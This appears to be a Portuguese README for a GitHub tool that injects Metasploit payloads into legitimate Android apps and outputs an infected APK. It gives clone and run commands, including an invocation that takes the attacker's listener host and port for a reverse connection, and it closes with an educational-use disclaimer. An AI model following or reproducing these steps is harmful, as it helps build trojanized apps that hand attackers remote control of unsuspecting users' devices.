# Payload APK Generator
O Payload APK Generator é uma ferramenta simples para injetar payloads Metasploit em aplicativos Android legítimos. Este script automatiza o processo de criação de um APK infectado para fins de teste e pesquisa.

## Requisitos

Certifique-se de ter as seguintes dependências instaladas no seu sistema:

- [APKTool](https://ibotpeaches.github.io/Apktool/)
- [Jarsigner](https://docs.oracle.com/en/java/javase/11/tools/jarsigner.html) ou [APKSigner](https://github.com/iBotPeaches/Apktool)

## Uso

1. Clone o repositório:

    ```bash
    git clone https://github.com/sucloudflare/payload-apk-generator.git
    ```

2. Navegue até o diretório do script:

    ```bash
    cd payload-apk-generator
    ```

3. Execute o script com os argumentos necessários:

    ```bash
    python payload_apk.py --lhost SEU_ENDERECO_IP --lport SUA_PORTA --normal-apk CAMINHO_APK_LEGITIMO --apk-name NOME_APK
    ```

    Certifique-se de substituir `SEU_ENDERECO_IP`, `SUA_PORTA`, `CAMINHO_APK_LEGITIMO` e `NOME_APK` pelos valores desejados.

4. O arquivo APK infectado será gerado no diretório e estará disponível como `Final_Infected.apk`.

## Contribuindo

Se você encontrar problemas ou tiver sugestões para melhorias, sinta-se à vontade para abrir uma [issue](https://github.com/sucloudflare/payload-apk-generator/issues) ou enviar um [pull request](https://github.com/sucloudflare/payload-apk-generator/pulls).

## Aviso Legal

Este script é destinado apenas para fins educacionais e de pesquisa. O uso indevido deste script em ambientes não autorizados é estritamente proibido.

